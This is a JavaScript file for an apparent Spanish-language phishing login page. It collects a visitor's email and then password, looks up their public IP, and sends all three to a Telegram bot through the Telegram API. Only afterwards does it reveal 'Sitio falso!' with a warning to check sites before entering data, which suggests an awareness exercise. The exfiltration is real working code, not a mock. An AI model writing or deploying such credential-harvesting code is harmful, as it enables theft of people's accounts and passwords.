var counter = 0;
var email, password;

async function sendToTelegram(email, password) {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ipv4 = ipData.ip;

    const message = `
    • Dirección IP : ${ipv4}\n• Correo: ${email}\n• Contraseña: ${password}
    `;

    const telegramApiKey = ${{ TELEGRAM_API_KEY }};
    const chatId = ${{ TELEGRAM_CHAT_ID }};
    const url = `https://api.telegram.org/bot${telegramApiKey}/sendMessage`;

    await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    });
}

function next() {
    enter();
}

window.onload=function() {
    var input = document.getElementById("input1");
    
    if(screen.width <= 450) {
        var box = document.getElementById('box');
        var grid = document.getElementById('grid-container');
        var email = document.getElementById('email');
        var logo = document.getElementById('logo');
        var input1 = document.getElementById('input1');
        var input2 = document.getElementById('input2');
        var input = document.getElementById('input');
        var header1 = document.getElementById('header1');
        var header2 = document.getElementById('header2');
        var forgot = document.getElementById('forgot');
        var guest = document.getElementById('guest-mode');
        var learn = document.getElementById('learn-more');
        var create = document.getElementById('create-account');
        var next = document.getElementById('next');
        var button = document.getElementById('button');
        document.body.style.background = "#ffffff";
        box.style.setProperty("width", "100%");
        var height = screen.height;
        box.style.setProperty("height", "100%");
        box.style.setProperty("vertical-align", "top");
        grid.style.setProperty("width", "100%");
        grid.style.setProperty("height", "100%");
        logo.style.setProperty("grid-column-end", "10");
        logo.style.setProperty("grid-row-start", "1");
        logo.style.setProperty("grid-row-end", "3");
        logo.style.setProperty("padding-top", "23px");
        logo.style.setProperty("padding-left", "2px");
        logo.style.setProperty("padding-bottom", "0px");
        header1.style.setProperty("grid-row-start", "3");
        header1.style.setProperty("grid-reow-end", "5");
        header1.style.setProperty("padding-top", "10px");
        header1.style.setProperty("padding-left", "3px");
        header2.style.setProperty("grid-row-start", "4");
        header2.style.setProperty("grid-column-end", "16");
        header2.style.setProperty("padding-left", "3px");
        header2.style.setProperty("padding-top", "15px");
        email.style.setProperty("grid-row-start", "6");
        email.style.setProperty("grid-row-end", "15");
        email.style.setProperty("padding-top", "35px");
        email.style.setProperty("padding-left", "2px");
        forgot.style.setProperty("grid-row-start", "11");
        forgot.style.setProperty("padding-left", "2px");
        guest.style.setProperty("grid-row-start", "14");
        guest.style.setProperty("grid-column-end", "19");
        guest.style.setProperty("padding-left", "0px");
        learn.style.setProperty("grid-row-start", "15");
        learn.style.setProperty("grid-column-start", "2");
        learn.style.setProperty("padding-left", "2px");
        create.style.setProperty("grid-row-start", "17");
        create.style.setProperty("padding-left", "2px");
        next.style.setProperty("grid-row-start", "17");
    }
    
    input.addEventListener("keydown", function (e) {
        if (e.keyCode === 13) {
            enter();
        }
    });
    
    input.focus();
}

function enter() {
    if (counter == 0) {
        email = document.getElementById('input1').value;
        counter++;
        change();
    }
   else if (counter == 1) {
        password = document.getElementById('input1').value;
        counter++;
        sendToTelegram(email, password);
        change2();
    }
}

function change2() {
    var input1 = document.getElementById('input1');
    var input2 = document.getElementById('input2');
    var header1 = document.getElementById('header1');
    var header2 = document.getElementById('header2');
    var forgot = document.getElementById('forgot-text');
    var guest = document.getElementById('guest-mode');
    var learn = document.getElementById('learn-more');
    var create = document.getElementById('create-account');
    var next = document.getElementById('next');
    input1.value = "";
    input1.type = "password";
    input1.disabled = true;
    input2.innerHTML = "Más precaución con tus datos";
    header1.innerHTML = "Sitio falso!";
    header1.style.paddingLeft -= 10;
    header1.style.setProperty("grid-column-end", "11");
    header2.innerHTML = "Verifique que los sitios sean reales antes de ingresar cualquier información personal.";
    header2.style.paddingLeft += 15;
    header2.style.setProperty("grid-column-end", "18");
    forgot.innerHTML = "¿Olvidaste tu constraseña?";
    guest.innerHTML = "";
    learn.innerHTML = "";
    create.innerHTML = "";
    next.style.setProperty("grid-row-start", "14");
    next.style.setProperty("grid-row-end", "15");
}

function change() {
    var input1 = document.getElementById('input1');
    var input2 = document.getElementById('input2');
    var header1 = document.getElementById('header1');
    var header2 = document.getElementById('header2');
    var forgot = document.getElementById('forgot-text');
    var guest = document.getElementById('guest-mode');
    var learn = document.getElementById('learn-more');
    var create = document.getElementById('create-account');
    var next = document.getElementById('next');
    input1.value = "";
    input1.type = "password";
    input2.innerHTML = "Ingresa tu contraseña";
    header1.innerHTML = "Bienvenido";
    header2.innerHTML = email;
    header2.style.paddingLeft += 15;
    forgot.innerHTML = "¿Olvidaste tu constraseña?";
    guest.innerHTML = "";
    learn.innerHTML = "";
    create.innerHTML = "";
    next.style.setProperty("grid-row-start", "14");
    next.style.setProperty("grid-row-end", "15");
}
